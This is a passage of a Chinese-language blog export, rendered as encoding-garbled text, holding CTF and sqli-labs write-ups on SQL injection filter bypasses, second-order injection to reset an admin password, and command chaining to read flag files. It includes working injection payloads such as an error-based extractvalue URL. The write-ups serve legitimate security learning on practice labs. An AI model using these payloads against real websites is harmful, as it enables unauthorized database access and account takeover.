æˆ‘ä»¬æƒ³è¦çš„æ•°æ®åº“åç§°å±…ç„¶æ²¡æœ‰æ­£å¸¸å›æ˜¾ï¼Œçœ‹ä¸‹hintçš„æ˜¾ç¤ºï¼Œunionä¸selectä¹‹é—´å±…ç„¶å‡ºç°äº†ä¸€ä¸ªå¥‡æ€ªçš„ç¬¦å·ï¼Œè¿™å°±ç›¸å½“ç¦»è°±äº†ï¼Œæˆ‘ä»¬å›ä¸»æœºçš„é¶åœºä¸Šè·‘ï¼š ç¿»è¯‘ç¿»è¯‘ä»€ä¹ˆå«æƒŠå–œï¼Œè¿™å°±å«æƒŠå–œï¼Œhintè¯­å¥å‡ºæ¥æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯ä¸»æœºé¶åœºå°±æ˜¯ä¸è®²é“ç†åœ°å›æ˜¾äº†æ•°æ®åº“åã€‚è¿™é‡Œæˆ‘ä»¬å¼€å§‹åšæ¨æµ‹ï¼š linuxç³»ç»Ÿä¸‹è¯»å–è§£æ%a0ç»“æœä¸windowsç³»ç»Ÿä¸‹ç»“æœä¸åŒï¼Œå¯¼è‡´åœ¨linuxç³»ç»Ÿä¸‹å‡ºç°è¯­æ³•é”™è¯¯ phpç‰ˆæœ¬ä¸åŒå¯¼è‡´%a0è§£æç»“æœä¸åŒ åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆäº†è§£åˆ°äº†è¿™ä¸ª%a0åœ¨æ­¤å¤„è¢«è§£æå‡ºçš„ç»“æœï¼Œå®ƒæ˜¯ç©ºæ ¼ï¼Œä½†åˆä¸å®Œå…¨æ˜¯ï¼Œå› ä¸ºå¦‚æœæ˜¯ç©ºæ ¼çš„è¯ï¼Œä¾‹å¦‚æˆ‘ä»¬ä½¿ç”¨%0aæ›¿æ¢%a0ï¼Œhintå›æ˜¾åº”è¯¥æ˜¯è¿union selectä¸€èµ·è¢«è¿‡æ»¤äº†ï¼Œå¾ˆæ˜¾ç„¶è¿™é‡Œå´æ²¡æœ‰ï¼Œä½†æ˜¯åœ¨ä¸»æœºé¶åœºä¸­è¿™ä¸ª%a0åˆèµ·åˆ°äº†ç©ºæ ¼çš„ä½œç”¨ã€‚ é€šè¿‡åœ¨ä¸»æœºå¦å¤–æ­å»ºäº†ä¸€ä¸ªphp7çš„é¶åœºæµ‹è¯•ï¼Œå‘ç°hintæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æ²¡æœ‰æ•°æ®åº“åçš„å›æ˜¾ï¼Œè¿™è¯æ˜äº†phpç‰ˆæœ¬æ˜¯è‚¯å®šæœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯ç¬¬ä¸€ç‚¹æš‚æ—¶æ²¡æœ‰è¯æ˜ï¼Œå› ä¸ºç°åœ¨çš„linuxç³»ç»Ÿåªèƒ½å®‰è£…php7åŠä»¥ä¸Šç‰ˆæœ¬ã€‚ é€šè¿‡èµ„æ–™æˆ‘ä»¬å‘ç°ï¼Œ%a0è§£ææˆç©ºæ ¼åªæœ‰åœ¨php5.2.17ç‰ˆæœ¬å¯ä»¥é€šè¿‡æˆåŠŸï¼Œç›®å‰çœ‹æ¥åº”è¯¥æ˜¯phpç‰ˆæœ¬çš„é—®é¢˜ã€‚28aé‡‡ç”¨ç›²æ³¨å°±è¡Œäº†ï¼Œç”šè‡³28aè¿ç©ºæ ¼å’Œæ³¨é‡Šç¬¦éƒ½æ²¡è¿‡æ»¤ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"sqli-labsç»ƒä¹ -less23-27","slug":"sqli-labsç»ƒä¹ -less23-27","date":"2021-10-21T07:35:08.000Z","updated":"2021-11-19T14:51:47.123Z","comments":true,"path":"2021/10/21/sqli-labsç»ƒä¹ -less23-27/","link":"","permalink":"http://example.com/2021/10/21/sqli-labs%E7%BB%83%E4%B9%A0-less23-27/","excerpt":"ç”±äºæ ¡èµ›çš„wpå·²ç»å‡ºæ¥äº†æˆ‘å°±ä¸å†™äº†ï¼ŒæŠŠsqli-labsçš„å‘å…ˆç»™å¡«äº†ã€‚ ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚","text":"ç”±äºæ ¡èµ›çš„wpå·²ç»å‡ºæ¥äº†æˆ‘å°±ä¸å†™äº†ï¼ŒæŠŠsqli-labsçš„å‘å…ˆç»™å¡«äº†ã€‚ ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚ less-23åˆ·äº†é‚£ä¹ˆå¤šèŠ±é‡Œèƒ¡å“¨çš„å…³å¡ï¼Œåˆå›åˆ°äº†ç†Ÿæ‚‰çš„GETé¡¿æ—¶ä»¤äººå€æ„Ÿäº²åˆ‡ã€‚ä¸è¿‡åŸæ¥çš„å€æ„Ÿäº²åˆ‡ç°åœ¨å˜å¾—æ¥åŠ¿æ±¹æ±¹ï¼Œæˆ‘ä»¬å‘ç°å…³å¡æ ‡é¢˜æç¤ºæˆ‘ä»¬è¿™å…³è¿‡æ»¤äº†æ³¨é‡Šç¬¦â€œ#â€å’Œâ€œâ€“â€ï¼Œæˆ‘ä»¬å…ˆæ¥æŸ¥çœ‹æºç ï¼š 12345$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id); è¿™è¡Œä»£ç çš„åŸç†å°±æ˜¯æ£€æµ‹åˆ°idä¸­å­˜åœ¨æ³¨é‡Šç¬¦æ—¶ä½¿ç”¨ç©ºä»£æ›¿ï¼Œå› æ­¤å¹³å¸¸çš„æ³¨é‡Šæ–¹æ³•å°±å¤±æ•ˆäº†ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜æœ‰å…¶ä»–çš„æ–¹æ³•â€”â€”é—­åˆè¯­å¥æ³•ã€‚åŸæ¥æˆ‘ä»¬è¦ä½¿ç”¨æ³¨é‡Šç¬¦æ˜¯å› ä¸ºæˆ‘ä»¬æ‰‹åŠ¨åŠ ä¸Šäº†ä¸€ä¸ªå•å¼•å·å¯¼è‡´æºç ä¸­å•å¼•å·æ— æ³•åŒ¹é…ï¼Œå› æ­¤ä½¿ç”¨æ³¨é‡Šç¬¦å°†åé¢çš„å•å¼•å·æ³¨é‡Šæ‰ã€‚ä¸è¿‡è¿™ä¸ªæ–¹æ³•ç°åœ¨è¡Œä¸é€šäº†ï¼Œé‚£æˆ‘ä»¬å°±æ¢ä¸ªæ€è·¯ï¼Œæ‰‹åŠ¨é—­åˆå•å¼•å·å°±å¯ä»¥äº†ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨or&#39;1æˆ–è€…or&#39;1&#39;=&#39;1æ¥è¿›è¡Œé—­åˆï¼Œæ•ˆæœå¦‚ä¸‹ï¼š ä¸è¿‡æ­¤å¤„æˆ‘ä»¬æ— æ³•ç”¨å•å¼•å·é—­åˆåœ¨æ‰§è¡Œorder byè¯­å¥ï¼Œç”±äºorder byä¹‹åéœ€è¦ä½¿ç”¨æ•°å­—ï¼Œè¿™é‡ŒåŠ å…¥å¼•å·ä½¿æ•°å­—è½¬æ¢æˆäº†å­—ç¬¦ä¸²å¯¼è‡´é”™è¯¯ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä»‹ç»å¦ä¸€ä¸ªç»•è¿‡æ–¹æ³•ï¼Œä½¿ç”¨%00ï¼š å…·ä½“åŸç†å¯ä»¥å‚ç…§ä¸‹é¢è¿™ä¸ªé“¾æ¥ï¼Œç®€å•æ¥è¯´%00æˆªæ–­ä¹Ÿå°±æ˜¯0x00ï¼Œç³»ç»Ÿåœ¨è¯»å–åˆ°0x00åå°±ä¼šåœæ­¢ç»§ç»­è¯»å–ï¼Œä»è€Œèµ·åˆ°è¿‡æ»¤åé¢å•å¼•å·çš„ä½œç”¨ï¼š0x00æˆªæ–­åŸç† ä¸è¿‡æ—¢ç„¶æ˜¯æˆªæ–­äº†ï¼Œæˆ‘ä»¬åœ¨æ„å»ºæ³¨å…¥è¯­å¥æ—¶ä¸€å®šè¦è®°å¾—åŠ ä¸Šåˆ†å·ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š è¿™æ ·å°±è§£å†³äº†æˆ‘ä»¬order byçš„ä½¿ç”¨é—®é¢˜ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œçˆ†åº“äº†ã€‚ less-24ä¸€é“POSTé¢˜ï¼Œæˆ‘ä»¬å‘ç°è¿™é“é¢˜å°±æ¯”è¾ƒå¤æ‚äº†ï¼Œé¡µé¢ä¸­æœ‰å¾ˆå¤šé€‰é¡¹ï¼Œæœ‰å¿˜è®°å¯†ç ï¼Œæœ‰åˆ›å»ºè´¦æˆ·ï¼ŒåŸé¡µé¢æ˜¯ç™»å½•ã€‚æ ¹æ®æ ‡é¢˜å†…å®¹æç¤ºæˆ‘ä»¬è¿™å…³æ˜¯åŒé‡æ³¨å…¥ï¼Œæˆ‘ä»¬å…ˆä»‹ç»ä¸€ä¸‹åŒé‡æ³¨å…¥ï¼š é¦–å…ˆæˆ‘ä»¬åœ¨httpè¯·æ±‚ä¸­æäº¤ä¸€æ¬¡æ¶æ„è¾“å…¥ä½¿å…¶ä¿å­˜è¿›æ•°æ®åº“ä¸­ï¼Œæ¥ç€æˆ‘ä»¬ç¬¬äºŒæ¬¡æäº¤httpè¯·æ±‚ï¼Œä¸ºäº†å“åº”è¿™æ¬¡çš„è¯·æ±‚ç¨‹åºä¼šæ£€ç´¢æ•°æ®åº“ä¸­çš„æ¶æ„è¾“å…¥ï¼ŒæˆåŠŸåˆ™ä¼šè¿”å›å¯¹åº”ç»“æœã€‚ äº†è§£åŸç†åï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥å®¡æŸ¥æºç ï¼Œé¦–å…ˆæ˜¯index.phpï¼Œä¸€ä¸Šæ¥å°±æ˜¯è¿™ä¸²ä»£ç ï¼š 1234session_start();if (isset($_SESSION[&#x27;username&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;Auth&#x27;])) &#123; header(&#x27;Location: logged-in.php&#x27;);&#125; Session_start()ï¼šå¼€å§‹ä¸€ä¸ªä¼šè¯æˆ–è€…è¿”å›å·²ç»å­˜åœ¨çš„ä¼šè¯ï¼Œsessionå‡½æ•°ä¿è¯äº†cookieå¯ä»¥åœ¨å¤šä¸ªé¡µé¢ä¸­è¢«åº”ç”¨ã€‚æˆ‘ä»¬ç»§ç»­å®¡æŸ¥ï¼Œä¼šå‘ç°å‡ ä¹æ¯ä¸ªPOSTç‚¹éƒ½è¢«ä¿æŠ¤çš„å¾ˆä¸¥å¯†ï¼Œé™¤äº†pass_change.phpï¼›ä¸­çš„usernameå‚æ•°æ˜¯ç›´æ¥é€šè¿‡sessionä¼ å…¥çš„ï¼Œè¿™å°±æ„å‘³ç€è¿™é‡Œå­˜åœ¨æ³¨å…¥ç‚¹ã€‚ é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆåˆ›é€ ä¸€ä¸ªè´¦æˆ·ï¼Œç”¨æˆ·åä¸ºadminâ€™#ã€‚æ³¨æ„ï¼Œå­—ç¬¦çš„è½¬ä¹‰æ˜¯æš‚æ—¶çš„ï¼Œä¸ä¼šå½±å“å­˜å…¥æ•°æ®åº“ä¸­çš„å€¼ã€‚ ä¸ºä»€ä¹ˆæˆ‘ä»¬è¿™é‡Œè¦å–è¿™ä¸ªåå­—ï¼Œæˆ‘ä»¬æ¥åˆ†ææ›´æ”¹å¯†ç çš„updateä»£ç ï¼š$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;; è¿™é‡Œæˆ‘ä»¬çš„usernameå¯¹åº”çš„å€¼ä¸ºadminâ€™#,ä»£å…¥ä»£ç åæˆ‘ä»¬å¾—åˆ°çš„æŒ‡ä»¤æ˜¯è¿™æ ·çš„ï¼š$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;; ä¸€ç›®äº†ç„¶ï¼Œusernameä¸­çš„å•å¼•å·é—­åˆäº†ä»£ç ä¸­çš„å•å¼•å·ï¼Œè€Œ#èµ·åˆ°äº†è¿‡æ»¤ä½œç”¨ï¼Œä½¿å¾—æˆ‘ä»¬æ— éœ€éªŒè¯åŸå¯†ç ä¹Ÿå¯ä»¥è¿›è¡Œæ”¹å¯†ï¼Œæ¥ç€æˆ‘ä»¬å°±å¯ä»¥æŠŠadminçš„å¯†ç è¿›è¡Œæ›´æ”¹äº†ã€‚ æ²¡é”™ï¼Œä¹‹å‰å†™åˆ°çš„adminå¯†ç 123456æˆ‘å°±æ˜¯åœ¨è¿™å…³æ”¹çš„ã€‚æœ€åæˆ‘ä»¬æ›´æ”¹å¯†ç å¹¶ç™»é™†adminï¼Œè§£é¢˜æˆåŠŸã€‚ less-25&amp;25aè¿™ä¸¤å…³æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œæ”¾ä¸€èµ·è®²ã€‚è¿™å…³çš„æç¤ºæ–‡å­—éƒ½å·²ç»è´´åœ¨æˆ‘ä»¬è„¸ä¸Šå‘Šè¯‰æˆ‘ä»¬é™¤äº†æ³¨é‡Šç¬¦ï¼Œandå’Œoréƒ½ä¸èƒ½ç”¨äº†ã€‚é‚£ä¹ˆé¦–å…ˆï¼Œ23å…³çš„%00æˆªæ–­æ³•åœ¨è¿™å…³ä»ç„¶é€‚ç”¨ï¼Œä½†å¦‚æœè¿™æ ·é‚£å°±å’Œless-23æ²¡åŒºåˆ«äº†ï¼Œé‚£æˆ‘ä»¬æ¢ç§æ–¹æ³•ã€‚ è¿™ä¸ªæ›¿æ¢çš„åŸç†æ˜¯æ£€æµ‹åˆ°oræˆ–è€…andå°±æ›¿æ¢æˆç©ºæ ¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¥—å¨ƒï¼Œå¥—ä¸€ä¸ªananddæˆ–è€…oorrå‡ºæ¥ï¼Œç³»ç»Ÿè¿‡æ»¤äº†å…¶ä¸­çš„andå’Œoråï¼Œæˆ‘ä»¬è¿˜èƒ½å‰©ä¸‹ä¸€ä¸ªandå’Œorï¼Œè¦æ³¨æ„ï¼Œåªè¦å­˜åœ¨andå’Œorï¼Œä¸ç®¡æ˜¯åœ¨å•è¯ä¸­è¿˜æ˜¯å•ç‹¬çš„ï¼Œæˆ‘ä»¬éƒ½éœ€è¦è¿›è¡Œå¥—å¨ƒï¼Œä¾‹å¦‚informationæˆ‘ä»¬å°±è¦å†™æˆinfoorrmationã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œå°†URLè¿›è¡Œç¼–ç ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ŒURLç¼–ç ç›´æ¥ä½¿ç”¨burp suiteå°±å¯ä»¥äº†ã€‚å¦‚æœæ˜¯å•ç‹¬çš„andå’Œorçš„è¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨&amp;&amp;å’Œ||æ›¿æ¢ï¼Œç½‘ä¸Šè¯´å¤§å°å†™å˜å½¢å¯ä»¥æ³¨å…¥ï¼Œä½†æˆ‘æµ‹è¯•äº†æ˜¯ä¸è¡Œçš„ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ˜¯è¯´ä¸åŒºåˆ†å¤§å°å†™ã€‚ 25aç”±äºæ²¡æœ‰å›æ˜¾ï¼Œå› æ­¤ä½¿ç”¨ç›²æ³¨å°±å¯ä»¥äº†ã€‚ less-26&amp;26aç°åœ¨è¿™å…³å‘ç€ä¸åšäººæ›´è¿›ä¸€æ­¥ï¼Œç©ºæ ¼ä¹Ÿç»™è¿‡æ»¤æ‰äº†ï¼Œä¸è¿‡é—®é¢˜ä¹Ÿä¸å¤§ï¼Œå¯¹ç©ºæ ¼çš„è¿‡æ»¤æˆ‘ä»¬æœ‰ä¸€å¥—å®Œæ•´çš„è§£å†³æ–¹æ¡ˆï¼š ç‰¹æ®Šå­—ç¬¦ï¼ˆ%å·å®¶æ—ï¼‰ï¼šåŒ…æ‹¬ä½†ä¸é™äº%20 %09 %0a %0b %0c %0d %a0 æ³¨é‡Šï¼š/**/ ä½¿ç”¨æ‹¬å·ï¼Œè®°å¾—è¦é—­åˆæ¯ä¸ªæ‹¬å· å¸¸ç”¨çš„æ–¹æ³•å°±æ˜¯ä»¥ä¸Šä¸‰è€…ï¼Œè¿™é‡Œä½¿ç”¨æ‹¬å·æ¥åšç¤ºèŒƒï¼šhttp://127.0.0.1/Less-26/?id=1%27oorr(extractvalue(1,concat(0x7e,(database()),0x7e)))aandnd%20%271%27=%271 ç”¨è”åˆæ³¨å…¥å½“ç„¶ä¹Ÿå¯ä»¥ã€‚è¦æ³¨æ„ï¼Œæ³¨é‡Šæ–¹æ³•ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œè€Œç‰¹æ®Šå­—ç¬¦åœ¨windowsä¸­å¯èƒ½å‡ºç°æ— æ³•è¢«æ›¿æ¢æˆç©ºæ ¼çš„é—®é¢˜ï¼Œå› æ­¤åœ¨windowsä¸‹å»ºè®®ä½¿ç”¨æ‹¬å·è¿›è¡Œç»•è¿‡ã€‚ 26aä¸­é‡‡ç”¨çš„è¿‡æ»¤æ–¹å¼ä¸ºå•å¼•å·+æ‹¬å·ï¼Œä¸”å…³é—­äº†é”™è¯¯å›æ˜¾ï¼Œå› æ­¤åªèƒ½ä½¿ç”¨ç›²æ³¨ï¼Œå…·ä½“æƒ…å†µå’Œ26å…³ä¸€æ ·ã€‚ less-27&amp;27aè¿™å…³å°±æ²¡æœ‰è¿‡æ»¤andå’Œoräº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¤±å»äº†unionå’Œselectï¼ŒåŒæ—¶æˆ‘ä»¬å‘ç°æœ‰äº›è¿‡æ»¤è¯­å¥åé¢çš„åæ–œæ ä¸Šæœ‰mæˆ–sï¼Œè¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œè¿™æ˜¯è®¾å®šçš„ä¿®æ­£ç¬¦ï¼Œä¿®æ­£ç¬¦çš„å…·ä½“æ•ˆæœå‚ç…§ä¸‹é¢è¿™ä¸ªé“¾æ¥ï¼šæ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ä¿®æ­£ç¬¦ ä¸è¿‡æˆ‘ä»¬å‘ç°è¿™é‡Œçš„union selectå¯ä»¥ä½¿ç”¨æ··åˆå¤§å°å†™æ¥ç»•è¿‡ï¼Œè€Œä¸”æºç ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æ„å‘³ç€åªè¦å«æœ‰å°±ä¼šè¢«è¿‡æ»¤ï¼Œå¥—å¨ƒæ–¹æ³•åœ¨è¿™å…³å°±å¤±æ•ˆäº†ã€‚åŒæ—¶è¿™å…³çš„è´Ÿå·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå› æ­¤idå€¼åº”è¯¥GETä¸€ä¸ªä¾‹å¦‚999çš„æ•°ã€‚æœ€åè¿›è¡Œçˆ†åº“å°±è¡Œäº†ã€‚å½“ç„¶æŠ¥é”™ä¸ç›²æ³¨ä¸€æ ·éƒ½æ˜¯å¯ä»¥çš„ã€‚ 27aåŒæ ·æ˜¯æ²¡æœ‰æŠ¥é”™ï¼Œä¸27æ²¡æœ‰ä»€ä¹ˆå·®åˆ«ï¼Œç›²æ³¨å°±è¡Œäº†ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","date":"2021-10-17T08:19:20.000Z","updated":"2021-12-01T08:28:48.605Z","comments":true,"path":"2021/10/17/æ”»é˜²ä¸–ç•Œ/","link":"","permalink":"http://example.com/2021/10/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/","excerpt":"å‰è¨€ç”±äºè¦å‡†å¤‡æ ¡èµ›è¿™å‘¨å°±æ²¡æœ‰åˆ·sqlié¶åœºäº†ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦å†™æ”»é˜²ä¸–ç•Œä¸­webçš„éƒ¨åˆ†æ–°æ‰‹é¢˜å’Œè¿›é˜¶é¢˜ï¼Œç­‰æ ¡èµ›ç¯å¢ƒå¼€äº†å°±æŠŠæ ¡èµ›çš„wpå†™äº†ï¼Œä¸‹å‘¨ç»§ç»­åˆ·é¶åœºã€‚","text":"å‰è¨€ç”±äºè¦å‡†å¤‡æ ¡èµ›è¿™å‘¨å°±æ²¡æœ‰åˆ·sqlié¶åœºäº†ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦å†™æ”»é˜²ä¸–ç•Œä¸­webçš„éƒ¨åˆ†æ–°æ‰‹é¢˜å’Œè¿›é˜¶é¢˜ï¼Œç­‰æ ¡èµ›ç¯å¢ƒå¼€äº†å°±æŠŠæ ¡èµ›çš„wpå†™äº†ï¼Œä¸‹å‘¨ç»§ç»­åˆ·é¶åœºã€‚ command_executionè¿™é¢˜éš¾åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œä½†åœ¨webæ–°æ‰‹é¢˜é‡Œåº”è¯¥ç®—æ˜¯æœ€éš¾çš„äº†ï¼Œè¿™é¢˜è¦æ±‚æˆ‘ä»¬è¿ç”¨åˆ°linuxå¸¸ç”¨æŒ‡ä»¤ã€‚ä¸è¿‡åœ¨è¿™ä¹‹å‰ï¼Œå…ˆç®€å•è¯´ä¸‹æç¤ºä¸­çš„wafï¼Œwafä¸ºwebæä¾›ä¿æŠ¤ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æŠ¤sqlæ³¨å…¥ç­‰ç­‰æ‰‹æ®µï¼Œå¯ä»¥å’Œé˜²ç«å¢™ç»“åˆèµ·æ¥ä¸€èµ·ç†è§£ã€‚ æ¥ç€æˆ‘ä»¬å†ä»‹ç»linuxçš„å‘½ä»¤æ‰§è¡Œä¸­çš„â€œ&amp;â€å’Œâ€œ|â€çš„ä½œç”¨ï¼š 1234c1 &amp;&amp; c2 å…ˆæ‰§è¡Œc1å†æ‰§è¡Œc2c1 &amp; c2 å…ˆæ‰§è¡Œc2åæ‰§è¡Œc1c1 || c2 c1æ‰§è¡Œå¤±è´¥åæ‰§è¡Œc2ï¼Œåä¹‹ä¸æ‰§è¡Œc2c1 | c2 åªæ‰§è¡Œc2 é™¤äº†è¿™äº›ï¼Œæˆ‘ä»¬è¿˜å¾—äº†è§£linuxåŸºæœ¬æŒ‡ä»¤ã€‚è¿™é¢˜æˆ‘ä»¬ä½¿ç”¨äº†lsæŒ‡ä»¤å’ŒcatæŒ‡ä»¤ï¼š 12ls æŸ¥çœ‹ç›®å½•æ–‡ä»¶cat è¯»å–æ–‡ä»¶ äº†è§£äº†è¿™äº›ï¼Œæˆ‘ä»¬å°±å¯ä»¥è§£é¢˜äº†ã€‚æˆ‘ä»¬ç›´æ¥æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š å°±åƒè¿™æ ·ï¼Œæˆ‘ä»¬ä¸€çº§ä¸€çº§å¾€ä¸ŠæŸ¥æ‰¾ï¼Œæ‰¾åˆ°æ ¹ç›®å½•åè¿›å…¥homeä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ç°flagå°±èººåœ¨é‡Œé¢ï¼Œç”¨catæŒ‡ä»¤æ‰“å¼€æŸ¥çœ‹å°±å¥½äº†ã€‚ simple_jsæŒ‰ç…§é“ç†æ¥è¯´ï¼Œè§é¢å°±è¦è¾“å¯†ç çš„é¢˜ï¼Œä¸€èˆ¬ä¸å¤ªå¯èƒ½å­—å…¸çˆ†ç ´çš„å‡ºæ¥ï¼Œå†ç»“åˆé¢˜ç›®æŒ‡å‘äº†jsï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å»æŸ¥çœ‹ç½‘é¡µçš„js 1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;head&gt; &lt;title&gt;JS&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function dechiffre(pass_enc)&#123; var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;; var tab = pass_enc.split(&#x27;,&#x27;); var tab2 = pass.split(&#x27;,&#x27;);var i,j,k,l=0,m,n,o,p = &quot;&quot;;i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;&#125; for(i = (o=0); i &lt; (k = j = n); i++ )&#123; o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; k-1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p;return pass; &#125; String[&quot;fromCharCode&quot;](dechiffre(&quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&quot;)); h = window.prompt(&#x27;Enter password&#x27;); alert( dechiffre(h) );&lt;/script&gt;&lt;/head&gt;&lt;/html&gt; æˆ‘ä»¬å‘ç°äº†ä¸€ä¸²/xâ€¦â€¦ä»£ç ï¼Œè¿™ä¸²ä»£ç çš„æ ¼å¼ä¸ºåå…­è¿›åˆ¶ç ï¼Œæˆ‘ä»¬æŠŠå®ƒè½¬æ¢ä¸ºå¯¹åº”çš„asciiç å€¼ï¼Œå¾—å‡ºçš„æ–‡æœ¬åè¿›åˆ¶å†è¿›è¡Œä¸€æ¬¡è½¬æ¢ï¼Œå¾—åˆ°å¯†ç ä¸º786OsErtk12ï¼Œè¿™å°±æ˜¯flagå†…å®¹ã€‚ isc-6æ ¹æ®é¢˜ç›®æˆ‘ä»¬è¿›å…¥æŠ¥è¡¨ä¸­å¿ƒï¼Œå‘ç°äº†ç†Ÿæ‚‰çš„getç‚¹ï¼Œè¿™é‡Œä¸‹æ„è¯†å…ˆè¿›è¡Œsqlæ³¨å…¥ï¼Œä½†å‘ç°å…¨éƒ¨å°è¯•éƒ½å¤±è´¥äº†ï¼Œæœæ–­æ’é™¤sqlæ³¨å…¥ã€‚å†ç»å†äº†å¾¡å‰‘ï¼ŒæŠ“åŒ…çš„æ´—ç¤¼ä¹Ÿæ²¡å‘ç°æœ‰é—®é¢˜ï¼Œå®¡è®¡æºç ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œç§ç§å¯èƒ½æ€§éƒ½è¢«æ’é™¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªèƒ½æŠŠç›®å…‰é”å®šåœ¨idå€¼ä¸Šäº†ã€‚ å†™ä¸€ä¸ªæœ€ç®€å•çš„è„šæœ¬ï¼š 12for m in range(10001): print(m) è¾“å‡ºçš„æ•°æ®æ”¾å…¥burp suiteä¸­è¿›è¡Œå­—å…¸çˆ†ç ´ï¼Œå‘ç°å½“idå€¼ä¸º2333æ—¶ï¼Œè¿”å›çš„é•¿åº¦ä¸åŒï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠ2333getä¸Šå»ï¼Œflagå°±æ˜¾ç¤ºå‡ºæ¥äº†ã€‚ æ€»ç»“å› ä¸ºè¿™å‘¨æ²¡åšé¶åœºï¼Œå°±æ‹¿è¿™å‘¨ç»ƒä¹ çš„é¢˜ç›®å†™äº†ç‚¹wpï¼Œå®é™…ä¸Šåšçš„é¢˜ä¸æ­¢è¿™äº›ï¼Œä¸è¿‡æœ‰äº›å› ä¸ºè¿‡äºç®€å•ï¼Œæœ‰äº›å› ä¸ºæ¯”è¾ƒå¤æ‚ï¼Œå°±éƒ½æ²¡æœ‰å†™å‡ºæ¥ï¼Œç­‰å®éªŒå®¤çš„æ¯”èµ›å¹³å°å¼€äº†å°±å»å†™æ¯”èµ›çš„wpã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"bugku-webç»ƒä¹ ","slug":"bugkuç»ƒä¹ ","date":"2021-10-14T06:55:42.000Z","updated":"2021-12-01T08:28:56.440Z","comments":true,"path":"2021/10/14/bugkuç»ƒä¹ /","link":"","permalink":"http://example.com/2021/10/14/bugku%E7%BB%83%E4%B9%A0/","excerpt":"å‰è¨€ç”±äºæ ¡èµ›è¦å¼€å§‹äº†ï¼Œå°±åšäº†äº›ç®€å•çš„é¢˜ç›®ç»ƒæ‰‹ï¼Œæœ‰bugkuä¹Ÿæœ‰æ”»é˜²ä¸–ç•Œçš„ï¼Œè¿™ç¯‡åšå®¢è®°å½•å‡ é¢˜bugkuçš„é¢˜ã€‚ æ»‘ç¨½çœ‹å›¾å®åœ¨è´¹çœ¼ç›ï¼Œç›´æ¥f12æŸ¥çœ‹æºç æ‰¾åˆ°flagèµ°äººå°±è¡Œäº†","text":"å‰è¨€ç”±äºæ 